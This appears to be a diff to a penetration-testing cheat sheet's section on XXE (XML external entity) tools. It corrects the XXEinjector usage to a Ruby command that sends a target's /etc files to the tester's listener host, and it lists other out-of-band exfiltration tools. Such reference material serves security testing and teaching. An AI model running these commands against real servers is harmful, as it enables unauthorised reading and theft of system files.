@@ -1751,7 +1751,7 @@ RMI example:
 
 |Tool                       |Purpose                                 |Usage                                              |
 |---------------------------|----------------------------------------|---------------------------------------------------|
-|**XXEinjector**            |Automated XXE payload generation        |`./xxeinjector.py -u http://target.com -f file`    |
+|**XXEinjector**            |Automated XXE payload generation        |`ruby xxeinjector.rb --host=<our IP> --path=/etc --file=<file with requests>`    |
 |**oxml_xxe**               |XXE in Office documents (DOCX, XLSX)    |`ruby server.rb`              |
 |**Burp Suite Collaborator**|OOB XXE detection and exfiltration      |Built-in to Burp Suite Pro                         |
 |**Interactsh**             |Free OOB interaction logging (DNS, HTTP)|`./interactsh-client`                              |
@@ -1763,8 +1763,7 @@ RMI example:
 ```bash
 git clone https://github.com/enjoiz/XXEinjector.git
 cd XXEinjector
-./xxeinjector.py -u http://target.com/api/process -f file.xml
-./xxeinjector.py -u http://target.com -t bing -p http://127.0.0.1:8080/admin
+ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt
 ```
 
 ### [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)
